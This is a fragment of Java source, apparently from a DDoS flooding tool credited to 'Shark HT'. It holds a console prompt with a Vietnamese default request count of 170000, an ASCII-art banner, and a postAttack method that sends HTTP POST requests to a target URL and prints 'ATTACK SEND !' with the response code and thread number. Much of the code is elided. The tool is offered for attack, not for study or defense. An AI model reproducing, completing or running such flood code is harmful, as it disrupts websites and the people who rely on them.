...
""");
        ...
        System.out.println("[+] Setting DDoS By: Shark HT");
        ...
        System.out.print("[+] METHOD Mặc Định=170000: ");
...
╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝═╩╝""");
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("ATTACK SEND !: " + responseCode + "Thread: " + this.seq);
    }
